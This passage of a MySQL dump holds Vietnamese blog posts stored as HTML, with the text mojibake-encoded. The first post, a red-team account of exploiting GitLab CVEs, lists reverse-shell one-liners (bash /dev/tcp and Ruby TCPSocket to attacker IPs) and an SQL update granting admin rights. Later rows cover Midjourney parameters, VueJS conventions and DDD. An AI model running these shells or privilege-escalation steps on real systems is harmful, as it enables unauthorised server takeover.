sß╗¡ dß╗Ñng&nbsp;<strong>CVE-2022-2185</strong>, CVE n&agrave;y li&ecirc;n quan ─æß║┐n t&iacute;nh n─âng import group, vß╗¢i kß║┐t quß║ú l&agrave; mß╗ùi lß║ºn thß╗▒c thi lß╗çnh phß║úi chß╗¥ n&oacute; 5 ph&uacute;t th&igrave; n&oacute; mß╗¢i chß║íy, do vß║¡y mß╗ùi lß║ºn muß╗æn thß╗▒c thi 1 command n&agrave;o ─æ&oacute;, m&igrave;nh phß║úi chß╗¥ ─æß╗úi trong v&ocirc; vß╗ìng rß║Ñt l&acirc;u. C&ograve;n&nbsp;<strong>CVE-2022-2992</strong> li&ecirc;n quan ─æß║┐n viß╗çc import 1 project tß╗½ github, viß╗çc n&agrave;y c┼⌐ng g&acirc;y ra nhß╗»ng rß╗ºi ro khi mß╗ùi lß║ºn chß║íy th&igrave; 1 project mß╗¢i ─æ╞░ß╗úc tß║ío trong 1 group, dß║½n ─æß║┐n r&aacute;c tr&ecirc;n server, admin ho&agrave;n to&agrave;n c&oacute; thß╗â nhß║¡n ra rß║▒ng ─æang c&oacute; ng╞░ß╗¥i lß║ím dß╗Ñng t&iacute;nh n─âng n&agrave;y v&agrave; c&oacute; thß╗â sß║╜ y&ecirc;u cß║ºu m&igrave;nh dß╗½ng lß║íi - c┼⌐ng l&agrave; dß╗½ng qu&aacute; tr&igrave;nh redteam (server c&agrave;i ─æß║╖t ng╞░ß╗¥i d&ugrave;ng th╞░ß╗¥ng khi x&oacute;a sß║╜ ─æß║╖t lß╗ïch 1 tuß║ºn sau mß╗¢i x&oacute;a hß║│n thay v&igrave; x&oacute;a ngay lß║¡p tß╗⌐c).</p>\n<p>&nbsp;</p>\n<p>V&igrave; vß║¡y, ─æiß╗üu cß║ºn ghi nhß╗¢ ─æ&oacute; l&agrave; phß║úi thß╗¡ thß║¡t ho&agrave;n thiß╗çn tr&ecirc;n local rß╗ôi mß╗¢i thß╗▒c hiß╗çn n&oacute; ß╗ƒ tr&ecirc;n server.</p>\n<p>C&aacute;c c&acirc;u lß╗çnh RCE tr&ecirc;n server docker m&igrave;nh tß╗▒ dß╗▒ng ─æß╗â thß╗▒c hiß╗çn back connect kh&aacute; hiß╗çu quß║ú, m&igrave;nh xin list ra mß╗Öt sß╗æ command:</p>\n<p><code>bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.14/443 0&gt;&amp;1\"</code></p>\n<p><code>ruby -rsocket -e\'f=TCPSocket.open(\"10.0.0.1\",4242).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)\'</code> (do Gitlab build bß║▒ng ruby do vß║¡y chß║»c chß║»n tr&ecirc;n server sß║╜ c&oacute; ruby).</p>\n<p>&nbsp;</p>\n<p>L&uacute;c n&agrave;y ta sß║╜ c&oacute; mß╗Öt reverse shell ─æß╗â dß╗à d&agrave;ng cho qu&aacute; tr&igrave;nh kiß╗âm so&aacute;t server.&nbsp;<em><strong>Nh╞░ng tr&ecirc;n server thß║¡t sß║╜ kh&ocirc;ng c&oacute; outbound connection</strong></em>&nbsp;n&ecirc;n d&ugrave; thß╗▒c hiß╗çn RCE c┼⌐ng chß╗ë l&agrave; Blind RCE. Do vß║¡y phß║úi c&oacute; mß╗Öt c&aacute;ch kh&aacute;c ─æß╗â thß╗▒c hiß╗çn lß║Ñy ─æ╞░ß╗úc source code.</p>\n<p>N&oacute;i qua vß╗ü c&aacute;c quyß╗ün trong Gitlab:&nbsp;<code>Owner</code>&nbsp;l&agrave; ng╞░ß╗¥i sß╗ƒ hß╗»u gilab, t╞░╞íng ─æ╞░╞íng admin, c&oacute; thß╗â quß║ún l&yacute; to&agrave;n bß╗Ö c&aacute;c repo v&agrave; user kh&aacute;c;&nbsp;<code>Maintainer</code>&nbsp;cß╗ºa 1 repo chß╗ë c&oacute; quyß╗ün quß║ún l&yacute; repo ─æ&oacute;;&nbsp;<code>Developer</code>&nbsp;chß╗ë c&oacute; quyß╗ün thß╗▒c hiß╗çn li&ecirc;n quan ─æß║┐n source code, kh&ocirc;ng ─æ╞░ß╗úc quß║ún l&yacute; vß╗ü repo nh╞░ x&oacute;a, CI/CD, ...; c&aacute;c user thß║Ñp h╞ín th&igrave; kh&ocirc;ng cß║ºn quan t&acirc;m tß╗¢i.</p>\n<p>Mß╗Öt c&aacute;ch kh&aacute;c hiß╗çn l&ecirc;n trong ─æß║ºu m&igrave;nh, ─æ&oacute; l&agrave; cß╗æ gß║»ng lß║Ñy ─æ╞░ß╗úc mß╗Öt user c&oacute; quyß╗ün admin. Trong gitlab server, ─æß╗â connect vß╗¢i database, ta sß║╜ sß╗¡ dß╗Ñng command&nbsp;<code>gitlab-psql</code> (gitlab chß╗ë sß╗¡ dß╗Ñng Postgresql). ─É&acirc;y l&agrave; mß╗Öt v&iacute; dß╗Ñ vß╗ü sß╗¡ dß╗Ñng gitlab-psql ─æß╗â select to&agrave;n bß╗Ö user.</p>\n<p>&nbsp;</p>\n<p><img style=\"display: block; margin-left: auto; margin-right: auto;\" src=\"https://images.viblo.asia/7a9f84e0-ceec-4f18-bef0-bcd129456a81.png\" alt=\"image.png\"></p>\n<p>&nbsp;</p>\n<p>&Yacute; t╞░ß╗ƒng ─æß║┐n mß╗Öt c&aacute;ch hiß╗ân nhi&ecirc;n: Chuyß╗ân user cß╗ºa m&igrave;nh tß╗½ admin = \'f\' th&agrave;nh admin = \'t\'</p>\n<p><code>UPDATE users SET admin=\'t\' WHERE username=\'realalphaman\'</code></p>\n<p>Viß╗çc n&agrave;y hoß║ít ─æß╗Öng hiß╗çu quß║ú khi g&otilde; shell trß╗▒c tiß║┐p, nh╞░ng kh&ocirc;ng hiß╗çu quß║ú khi chß║íy th&ocirc;ng qua CVE. V&agrave; m&igrave;nh ph&aacute;t hiß╗çn ra khi m&igrave;nh chß║íy shell (bß║▒ng&nbsp;<code>docker exec -it /bin/bash</code>) th&igrave; m&igrave;nh ─æang chß║íy d╞░ß╗¢i quyß╗ün&nbsp;<code>root</code>, trong khi user d&ugrave;ng ─æß╗â chß║íy gitlab l&agrave;&nbsp;<code>git</code>, user n&agrave;y kh&ocirc;ng c&oacute; quyß╗ün chß║íy&nbsp;<code>gitlab-psql</code>. M&igrave;nh tß╗▒ hß╗Åi nß║┐u nh╞░ thß║┐ th&igrave; l&agrave;m thß║┐ n&agrave;o ─æß╗â n&oacute; c&oacute; thß╗â thß╗▒c hiß╗çn truy vß║Ñn database?</p>\n<p>H&oacute;a ra gitlab sß╗¡ dß╗Ñng 2 c&ocirc;ng cß╗Ñ l&agrave;&nbsp;<code>gitlab-rake</code>&nbsp;v&agrave;&nbsp;<code>gitlab-rails</code> nh╞░ nhß╗»ng tr&igrave;nh bao ─æß╗â connect v&agrave;o database. Nh╞░ vß║¡y ta sß║╜ c&oacute; 1 sß╗æ c&aacute;ch thß╗⌐c sau ─æß╗â thß╗▒c hiß╗çn chiß║┐m quyß╗ün Admin:</p>','05485540-2eef-11ee-a545-0242ac130002','2023-08-03 10:30:41',NULL,'Quß║ún l├╜ m├ú nguß╗ôn ß╗⌐ng dß╗Ñng - Source code management'),('249329f6-b2ba-4af9-bf76-9af4b16d427a','dcb94c92-1048-11ee-98af-0242ac130002','ddc7a9f4-13b9-11ee-b55a-0242ac130002','<p><img style=\"display: block; margin-left: auto; margin-right: auto;\" src=\"https://images.viblo.asia/8e49ac29-acf6-44b5-b346-38d4fdb496f2.png\" alt=\"1.png\"></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<h1><strong>─Éß╗ïnh ngh─⌐a Promp</strong></h1>\n<p>Theo Midjourney, Midjourney prompt (y&ecirc;u cß║ºu) l&agrave; mß╗Öt cß╗Ñm tß╗½ v─ân bß║ún ngß║»n m&agrave; bot diß╗àn giß║úi ─æß╗â tß║ío ra mß╗Öt h&igrave;nh ß║únh. Midjourney Bot chia c&aacute;c tß╗½ v&agrave; cß╗Ñm tß╗½ trong y&ecirc;u cß║ºu th&agrave;nh c&aacute;c phß║ºn nhß╗Å h╞ín, ─æ╞░ß╗úc gß╗ìi l&agrave; m&atilde; th&ocirc;ng b&aacute;o, c&oacute; thß╗â ─æ╞░ß╗úc so s&aacute;nh vß╗¢i dß╗» liß╗çu ─æ&agrave;o tß║ío cß╗ºa n&oacute; v&agrave; sau ─æ&oacute; ─æ╞░ß╗úc sß╗¡ dß╗Ñng ─æß╗â tß║ío h&igrave;nh ß║únh. Y&ecirc;u cß║ºu ─æ╞░ß╗úc thiß║┐t kß║┐ tß╗æt c&oacute; thß╗â gi&uacute;p tß║ío ra nhß╗»ng h&igrave;nh ß║únh gß║ºn s&aacute;t vß╗¢i li&ecirc;n t╞░ß╗ƒng cß╗ºa bß║ín h╞ín.</p>\n<h1><strong>Th&agrave;nh phß║ºn Promp</strong></h1>\n<p><img style=\"display: block; margin-left: auto; margin-right: auto;\" src=\"https://images.viblo.asia/143b3385-7027-4174-90f3-7c099432acf5.png\" alt=\"2.png\"></p>\n<p>&nbsp;</p>\n<h2>1. Basic Promp</h2>\n<p>Y&ecirc;u cß║ºu c╞í bß║ún c&oacute; thß╗â bao gß╗ôm: mß╗Öt tß╗½ (single word), cß╗Ñm tß╗½ (phrase) hoß║╖c biß╗âu t╞░ß╗úng cß║úm x&uacute;c (emoji).</p>\n<h2>2. Advance Promp</h2>\n<p>C&aacute;c y&ecirc;u cß║ºu n&acirc;ng cao h╞ín c&oacute; thß╗â bao gß╗ôm mß╗Öt hoß║╖c nhiß╗üu URL h&igrave;nh ß║únh (image URLS), nhiß╗üu cß╗Ñm tß╗½ v─ân bß║ún (mutiple text phrases) v&agrave; mß╗Öt hoß║╖c nhiß╗üu tham sß╗æ (parameters).</p>\n<ul>\n<li><strong>Image Prompt (Y&ecirc;u cß║ºu h&igrave;nh ß║únh):</strong>&nbsp;URL h&igrave;nh ß║únh c&oacute; thß╗â ─æ╞░ß╗úc th&ecirc;m v&agrave;o y&ecirc;u cß║ºu ─æß╗â t&aacute;c ─æß╗Öng ─æß║┐n phong c&aacute;ch v&agrave; nß╗Öi dung cß╗ºa kß║┐t quß║ú ─æ&atilde; ho&agrave;n th&agrave;nh. URL h&igrave;nh ß║únh lu&ocirc;n ─æi tr╞░ß╗¢c dß║Ñu nhß║»c.</li>\n<li><strong>Text Prompt (Y&ecirc;u cß║ºu v─ân bß║ún):</strong>&nbsp;M&ocirc; tß║ú v─ân bß║ún cß╗ºa h&igrave;nh ß║únh bß║ín muß╗æn tß║ío. Prompt ─æ╞░ß╗úc viß║┐t tß╗æt gi&uacute;p tß║ío ra nhß╗»ng h&igrave;nh ß║únh tuyß╗çt vß╗¥i.</li>\n<li><strong>Parameters (Tham sß╗æ):</strong> C&aacute;c tham sß╗æ thay ─æß╗òi c&aacute;ch mß╗Öt h&igrave;nh ß║únh ─æ╞░ß╗úc tß║ío ra. C&aacute;c tham sß╗æ c&oacute; thß╗â thay ─æß╗òi tß╗╖ lß╗ç khung h&igrave;nh, kiß╗âu m&aacute;y, t&iacute;nh n─âng n&acirc;ng cß║Ñp, v.v. C&aacute;c tham sß╗æ ß╗ƒ cuß╗æi dß║Ñu nhß║»c.</li>\n</ul>\n<h1><strong>Ph&acirc;n loß║íi parameter</strong></h1>\n<p>Parameters (Tham sß╗æ) l&agrave; c&aacute;c lß╗▒a chß╗ìn ─æ╞░ß╗úc th&ecirc;m v&agrave;o c&acirc;u lß╗çnh l&agrave;m thay ─æß╗òi viß╗çc tß║ío ra h&igrave;nh ß║únh. Tham sß╗æ c&oacute; thß╗â thay ─æß╗òi tß╗╖ lß╗ç bß╗⌐c ß║únh, thay ─æß╗òi giß╗»a c&aacute;c bß║ún model cß╗ºa Midjourney, thay ─æß╗òi viß╗çc sß╗¡ dß╗Ñng Upscale v&agrave; nhiß╗üu h╞ín nß╗»a.</p>\n<ol>\n<li>\n<p><strong>Aspect Ratios:</strong>&nbsp;--aspect, hoß║╖c --ar Thay ─æß╗òi tß╗╖ lß╗ç khung ß║únh cß╗ºa ß║únh xuß║Ñt ra.</p>\n</li>\n<li>\n<p><strong>Chaos:</strong>&nbsp;--chaos &lt;number 0&ndash;100&gt; Thay ─æß╗òi mß╗⌐c ─æß╗Ö ─æa dß║íng cß╗ºa kß║┐t quß║ú. Gi&aacute; trß╗ï cao h╞ín tß║ío ra nhiß╗üu biß║┐n thß╗â v&agrave; bß║Ñt ngß╗¥ h╞ín.</p>\n</li>\n<li>\n<p><strong>Fast:</strong>&nbsp;--fast ghi ─æ&egrave; c&agrave;i ─æß║╖t hiß╗çn tß║íi cß╗ºa bß║ín v&agrave; chß║íy mß╗Öt c&ocirc;ng viß╗çc bß║▒ng Chß║┐ ─æß╗Ö nhanh.</p>\n</li>\n<li>\n<p><strong>Image Weight:</strong>&nbsp;--iw &lt;0&ndash;2&gt; ─Éß║╖t trß╗ìng l╞░ß╗úng dß║Ñu nhß║»c h&igrave;nh ß║únh so vß╗¢i trß╗ìng l╞░ß╗úng v─ân bß║ún. Gi&aacute; trß╗ï mß║╖c ─æß╗ïnh l&agrave; 1.</p>\n</li>\n<li>\n<p><strong>No:</strong>&nbsp;--no Negative, --no plants sß║╜ cß╗æ gß║»ng loß║íi bß╗Å thß╗▒c vß║¡t khß╗Åi h&igrave;nh ß║únh.</p>\n</li>\n<li>\n<p><strong>Quality:</strong>&nbsp;--quality &lt;.25, .5, or 1&gt;, hoß║╖c --q &lt;.25, .5, or 1&gt; Bß║ín muß╗æn d&agrave;nh bao nhi&ecirc;u thß╗¥i gian kß║┐t xuß║Ñt chß║Ñt l╞░ß╗úng. Gi&aacute; trß╗ï mß║╖c ─æß╗ïnh l&agrave; Gi&aacute; trß╗ï cao h╞ín sß╗¡ dß╗Ñng nhiß╗üu GPU ph&uacute;t h╞ín ; gi&aacute; trß╗ï thß║Ñp h╞ín sß╗¡ dß╗Ñng &iacute;t h╞ín.</p>\n</li>\n<li>\n<p><strong>Relax:</strong>&nbsp;--relax ghi ─æ&egrave; c&agrave;i ─æß║╖t hiß╗çn tß║íi cß╗ºa bß║ín v&agrave; chß║íy mß╗Öt c&ocirc;ng viß╗çc duy nhß║Ñt bß║▒ng Chß║┐ ─æß╗Ö th╞░ gi&atilde;n.</p>\n</li>\n<li>\n<p><strong>Repeat:</strong>&nbsp;--repeat &lt;1&ndash;40&gt;, hoß║╖c --r &lt;1&ndash;40&gt; Tß║ío nhiß╗üu hß╗ënh ß║únh tß╗½ mß╗Öt prompt duy nhß║Ñt. --repeat rß║Ñt hß╗»u &iacute;ch ─æß╗â nhanh ch&oacute;ng chß║íy lß║íi mß╗Öt c&ocirc;ng viß╗çc nhiß╗üu lß║ºn.</p>\n</li>\n<li>\n<p><strong>Seed:</strong>&nbsp;--seed &lt;integer between 0&ndash;4294967295&gt; Bot Midjourney sß╗¡ dß╗Ñng sß╗æ hß║ít giß╗æng ─æß╗â tß║ío tr╞░ß╗¥ng nhiß╗àu h&igrave;nh ß║únh, giß╗æng nh╞░ t─⌐nh tr&ecirc;n truyß╗ün h&igrave;nh, l&agrave;m ─æiß╗âm bß║»t ─æß║ºu ─æß╗â tß║ío l╞░ß╗¢i h&igrave;nh ß║únh ban ─æß║ºu. Sß╗æ hß║ít giß╗æng ─æ╞░ß╗úc tß║ío ngß║½u nhi&ecirc;n cho mß╗ùi h&igrave;nh ß║únh nh╞░ng c&oacute; thß╗â ─æ╞░ß╗úc chß╗ë ─æß╗ïnh bß║▒ng tham sß╗æ --seed hoß║╖c --sameseed. Sß╗¡ dß╗Ñng c&ugrave;ng mß╗Öt sß╗æ hß║ít giß╗æng v&agrave; dß║Ñu nhß║»c sß║╜ tß║ío ra c&aacute;c h&igrave;nh ß║únh kß║┐t th&uacute;c t╞░╞íng tß╗▒.</p>\n</li>\n<li>\n<p><strong>Stop:</strong>&nbsp;--stop &lt;integer between 10&ndash;100&gt; Sß╗¡ dß╗Ñng --stop ─æß╗â ho&agrave;n th&agrave;nh mß╗Öt C&ocirc;ng viß╗çc trong suß╗æt qu&aacute; tr&igrave;nh. Dß╗½ng mß╗Öt C&ocirc;ng viß╗çc ß╗ƒ mß╗Öt tß╗╖ lß╗ç phß║ºn tr─âm sß╗¢m h╞ín c&oacute; thß╗â tß║ío ra kß║┐t quß║ú mß╗¥ h╞ín, &iacute;t chi tiß║┐t h╞ín.</p>\n</li>\n<li>\n<p><strong>Style:</strong>&nbsp;* --style &lt;raw&gt; Chuyß╗ân ─æß╗òi giß╗»a c&aacute;c phi&ecirc;n bß║ún cß╗ºa M&ocirc; h&igrave;nh Midjourney Phi&ecirc;n bß║ún 5.1 v&agrave; 5.2; --style &lt;4a, 4b, or 4c&gt; Chuyß╗ân ─æß╗òi giß╗»a c&aacute;c phi&ecirc;n bß║ún cß╗ºa M&ocirc; h&igrave;nh Midjourney Phi&ecirc;n bß║ún 4; --style &lt;cute, expressive, original, or scenic&gt; Chuyß╗ân ─æß╗òi giß╗»a c&aacute;c phi&ecirc;n bß║ún cß╗ºa M&ocirc; h&igrave;nh Niji Phi&ecirc;n bß║ún 5.</p>\n</li>\n<li>\n<p><strong>Stylize:</strong>&nbsp;--stylize &lt;number&gt;, hoß║╖c --s &lt;number&gt; Th&ocirc;ng sß╗æ ß║únh h╞░ß╗ƒng ─æß║┐n mß╗⌐c ─æß╗Ö phong c&aacute;ch thß║⌐m mß╗╣ mß║╖c ─æß╗ïnh cß╗ºa Midjourney ─æ╞░ß╗úc &aacute;p dß╗Ñng cho Jobs.</p>\n</li>\n<li>\n<p><strong>Tile:</strong>&nbsp;--tile tham sß╗æ tß║ío ra c&aacute;c h&igrave;nh ß║únh c&oacute; thß╗â ─æ╞░ß╗úc sß╗¡ dß╗Ñng l&agrave;m c&aacute;c &ocirc; lß║╖p lß║íi ─æß╗â tß║ío c&aacute;c mß║½u liß╗ün mß║ích.</p>\n</li>\n<li>\n<p><strong>Turbo:</strong>&nbsp;--Turbo ghi ─æ&egrave; c&agrave;i ─æß║╖t hiß╗çn tß║íi cß╗ºa bß║ín v&agrave; chß║íy mß╗Öt c&ocirc;ng viß╗çc bß║▒ng Chß║┐ ─æß╗Ö Turbo.</p>\n</li>\n<li>\n<p><strong>Weird:</strong> --Weird &lt;number 0&ndash;3000&gt; Kh&aacute;m ph&aacute; t&iacute;nh thß║⌐m mß╗╣ kh&aacute;c th╞░ß╗¥ng vß╗¢i --weird tham sß╗æ thß╗¡ nghiß╗çm.</p>\n</li>\n</ol>\n<p>Ch&uacute;c bß║ín th&agrave;nh c&ocirc;ng tß║ío nhiß╗üu h&igrave;nh ß║únh concept tuyß╗çt vß╗¥i vß╗¢i Midjourney!</p>','05485540-2eef-11ee-a545-0242ac130002','2023-08-03 09:49:09','2023-08-03 09:55:42','Giß╗¢i thiß╗çu vß╗ü Midjourney: H╞░ß╗¢ng dß║½n sß╗¡ dß╗Ñng Parameter'),('3476e29d-ff26-4027-b4c3-ecad953af36c','dcb94c92-1048-11ee-98af-0242ac130002','53da58f8-ef0d-11ed-ae2b-0242ac130002','<p>Xin ch&agrave;o c&aacute;c bß║ín, h&ocirc;m nay m&igrave;nh sß║╜ chia sß║╗ nhß╗»ng quy tß║»c khi code VueJs gi&uacute;p ch&uacute;ng ta ng─ân ngß╗½a lß╗ùi trong qu&aacute; tr&igrave;nh code.</p>\n<p><strong><span style=\"font-size: 18pt;\">1. </span></strong><strong><span style=\"font-size: 18pt;\">Essential (Thiß║┐t yß║┐u).</span></strong></p>\n<h3 id=\"_1-su-dung-ten-component-nhieu-tu-1\">1. Sß╗¡ dß╗Ñng t&ecirc;n component nhiß╗üu tß╗½.</h3>\n<ul>\n<li>T&ecirc;n&nbsp;<strong>Component&nbsp;</strong> lu&ocirc;n phß║úi c&oacute; nhiß╗üu tß╗½, ngoß║íi trß╗½ c&aacute;c component root nh╞░&nbsp;<strong><code>App</code></strong>. ─Éiß╗üu n&agrave;y ng─ân xung ─æß╗Öt vß╗¢i c&aacute;c phß║ºn tß╗¡ HTML hiß╗çn tß║íi v&agrave; t╞░╞íng lai, v&igrave; tß║Ñt cß║ú c&aacute;c phß║ºn tß╗¡ HTML l&agrave; mß╗Öt tß╗½ duy nhß║Ñt.</li>\n<li>Bad:</li>\n</ul>\n<p><code><span class=\"token comment\">// &lt;!-- in pre-compiled templates --&gt;</span> </code></p>\n<p><code><span class=\"token operator\">&lt;</span>Item <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span> </code></p>\n<p><code><span class=\"token comment\">// &lt;!-- in in-DOM templates --&gt;</span> </code></p>\n<p><code><span class=\"token operator\">&lt;</span>item<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>item&gt;</code></p>\n<ul>\n<li><strong>Good:</strong></li>\n</ul>\n<p><code><strong><span class=\"token comment\">// &lt;!-- in pre-compiled templates --&gt;</span> </strong></code></p>\n<p><code><strong><span class=\"token operator\">&lt;</span>TodoItem <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span> </strong></code></p>\n<p><code><strong><span class=\"token comment\">// &lt;!-- in in-DOM templates --&gt;</span> </strong></code></p>\n<p><code><strong><span class=\"token operator\">&lt;</span>todo<span class=\"token operator\">-</span>item<span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>todo<span class=\"token operator\">-</span>item<span class=\"token operator\">&gt;</span></strong></code></p>\n<h3 id=\"_1-su-dung-ten-component-nhieu-tu-1\">2. Sß╗¡ dß╗Ñng define Props.</h3>\n<ul>\n<li>\n<p>Trong defineProps ch&uacute;ng ta n&ecirc;n chß╗ë ─æß╗ïnh c&aacute;c loß║íi dß╗» liß╗çu c&agrave;ng chi tiß║┐t c&agrave;ng tß╗æt.</p>\n</li>\n<li>Trong qu&aacute; tr&igrave;nh code, Vue sß║╜ cß║únh b&aacute;o nß║┐u mß╗Öt&nbsp;<code>component</code>&nbsp;─æ╞░ß╗úc cung cß║Ñp c&aacute;c&nbsp;<code>props</code>&nbsp;c&oacute; ─æß╗ïnh dß║íng kh&ocirc;ng ch&iacute;nh x&aacute;c, gi&uacute;p ch&uacute;ng ta ph&aacute;t hiß╗çn c&aacute;c lß╗ùi tiß╗üm ß║⌐n.</li>\n</ul>\n<p>&nbsp;</p>\n<ul>\n<li>\n<p><strong>Bad</strong></p>\n</li>\n</ul>\n<p>&nbsp;</p>\n<ul>\n<li><strong>Good</strong></li>\n</ul>\n<h3 id=\"_3-su-dung-key-trong-v-for-3\">3. Sß╗¡ dß╗Ñng Key trong&nbsp;<code>v-for</code></h3>\n<ul>\n<li>\n<p><code>key</code>&nbsp;trong&nbsp;<code>v-for</code>&nbsp;l&agrave; mß╗Öt thuß╗Öc t&iacute;nh d&ugrave;ng ─æß╗â ─æß╗ïnh danh duy nhß║Ñt cho mß╗ùi phß║ºn tß╗¡ khi lß║╖p qua mß╗Öt mß║úng hoß║╖c mß╗Öt ─æß╗æi t╞░ß╗úng. Key gi&uacute;p Vue x&aacute;c ─æß╗ïnh v&agrave; quß║ún l&yacute; sß╗▒ thay ─æß╗òi cß╗ºa c&aacute;c phß║ºn tß╗¡ trong danh s&aacute;ch khi dß╗» liß╗çu thay ─æß╗òi.</p>\n</li>\n<li>\n<p>Khi sß╗¡ dß╗Ñng&nbsp;<code>v-for</code> ─æß╗â lß║╖p qua mß╗Öt mß║úng, bß║ín n&ecirc;n cung cß║Ñp thuß╗Öc t&iacute;nh key ─æß╗â ─æß║úm bß║úo hiß╗çu suß║Ñt tß╗æt h╞ín khi thay ─æß╗òi dß╗» liß╗çu. Key gi&uacute;p Vue nhß║¡n biß║┐t xem c&aacute;c phß║ºn tß╗¡ ─æ&atilde; th&ecirc;m, x&oacute;a, hoß║╖c di chuyß╗ân trong danh s&aacute;ch.</p>\n</li>\n</ul>\n<h3 id=\"_4-tranh-v-if-with-v-for-4\">4. Tr&aacute;nh&nbsp;<code>v-if</code>&nbsp;with&nbsp;<code>v-for</code></h3>\n<h2 id=\"_ii-ket-thuc-5\">II. Kß║┐t th&uacute;c</h2>\n<ul>\n<li>─É&acirc;y l&agrave; nhß╗»ng quy tß║»c m&igrave;nh tß╗òng hß╗úp trong phß║ºn n&agrave;y, m&igrave;nh sß║╜ tiß║┐p tß╗Ñc tß╗òng hß╗úp th&ecirc;m cho c&aacute;c phß║ºn tiß║┐p theo nh&eacute;.!!! Byeeeee</li>\n</ul>\n<h3>&nbsp;</h3>\n<h3>&nbsp;</h3>\n<h3>&nbsp;</h3>\n<p>&nbsp;</p>','05485540-2eef-11ee-a545-0242ac130002','2023-07-31 20:54:21','2023-08-01 01:48:53','Nhß╗»ng quy tß║»c trong VueJS'),('531a0109-a5e4-4561-bb70-627204290180','dcb94c92-1048-11ee-98af-0242ac130002','53da58f8-ef0d-11ed-ae2b-0242ac130002','<p>Trong phß║ºn n&agrave;y, t&ocirc;i xin ph&eacute;p ─æ╞░ß╗úc tr&igrave;nh b&agrave;y vß╗¢i bß║ín ─æß╗ìc vß╗ü 2 nß╗Öi dung ch&iacute;nh sau:</p>\n<ol>\n<li>C&aacute;ch triß╗ân khai tß║ºng presentation.</li>\n<li>C&aacute;ch triß╗ân khai tß║ºng infrastructure.</li>\n</ol>\n<p>hi vß╗ìng sß║╜ ─æ╞░ß╗úc bß║ín ─æß╗ìc ─æ&oacute;n nhß║¡n mß╗Öt c&aacute;ch nß╗ông nhiß╗çt nhß║Ñt. Xin cß║úm ╞ín.</p>\n<p><span style=\"font-size: 18pt;\"><strong>1. C&aacute;ch triß╗ân khai phß║ºn presentation.</strong></span></p>\n<h3 id=\"_xu-li-cua-tang-presentation-1\">Xß╗¡ l&iacute; cß╗ºa tß║ºng presentation</h3>\n<p>─É&acirc;y sß║╜ l&agrave; tß║ºng t╞░╞íng t&aacute;c trß╗▒c tiß║┐p vß╗¢i client, do ─æ&oacute; ß╗ƒ giß╗»a tß║ºng presentation v&agrave; tß║ºng usecase cß║ºn thß╗▒c hiß╗çn convert data.</p>\n<p>&nbsp;</p>\n<p><img style=\"display: block; margin-left: auto; margin-right: auto;\" src=\"https://user-images.githubusercontent.com/15076665/178100102-b6d54ae4-7634-4615-9889-5b1e9f528afd.png\" alt=\"File_000\" width=\"805\" height=\"409\"></p>\n<p>&nbsp;</p>\n<p>Trong ß╗⌐ng dß╗Ñng sß║╜ c&oacute;:</p>\n<ul>\n<li>JSON controller nhß║¡n v&agrave; trß║ú vß╗ü kß║┐t quß║ú d╞░ß╗¢i format json</li>\n<li>HTML controller nhß║¡n dß╗» liß╗çu submit tß╗½ HTML form th&ocirc;ng qua format&nbsp;<strong>application/x-www-form-urlencoded</strong></li>\n</ul>','3d73334d-2eef-11ee-a545-0242ac130002','2023-07-31 22:43:37',NULL,'X├óy dß╗▒ng API bß║▒ng DDD');
/*!40000 ALTER TABLE `post` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `postcategory`
--

DROP TABLE IF EXISTS `postcategory`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `postcategory` (
  `PostCategoryID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `CategoryName` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `ProjectID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (`PostCategoryID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='Bß║úng danh mß╗Ñc cß╗ºa b├ái viß║┐t';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `postcategory`
--

LOCK TABLES `postcategory` WRITE;
/*!40000 ALTER TABLE `postcategory` DISABLE KEYS */;
INSERT INTO `postcategory` VALUES ('05485540-2eef-11ee-a545-0242ac130002','Ch╞░a c├│ danh mß╗Ñc','2023-07-30 22:37:41','B-1179','00000000-0000-0000-0000-000000000000'),('363ffd10-2eef-11ee-a545-0242ac130002','Front-end','2023-07-30 22:39:03','B-1179','dcb94c92-1048-11ee-98af-0242ac130002'),('3d73334d-2eef-11ee-a545-0242ac130002','Back-end','2023-07-30 22:39:15','B-1179','dcb94c92-1048-11ee-98af-0242ac130002'),('447ffe62-2eef-11ee-a545-0242ac130002','Triß╗ân khai','2023-07-30 22:39:27','B-1179','dcb94c92-1048-11ee-98af-0242ac130002');
/*!40000 ALTER TABLE `postcategory` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `postcomment`
--

DROP TABLE IF EXISTS `postcomment`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `postcomment` (
  `CommentID` char(36) COLLATE utf8mb4_unicode_ci NOT NULL,
  `PostID` char(36) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `Content` text COLLATE utf8mb4_unicode_ci,
  `CreatedBy` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `CreatedDate` datetime DEFAULT NULL,
  `ModifiedDate` datetime DEFAULT NULL,
  PRIMARY KEY (`CommentID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci COMMENT='B├¼nh luß║¡n cß╗ºa b├ái viß║┐t';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `postcomment`
--

LOCK TABLES `postcomment` WRITE;
/*!40000 ALTER TABLE `postcomment` DISABLE KEYS */;
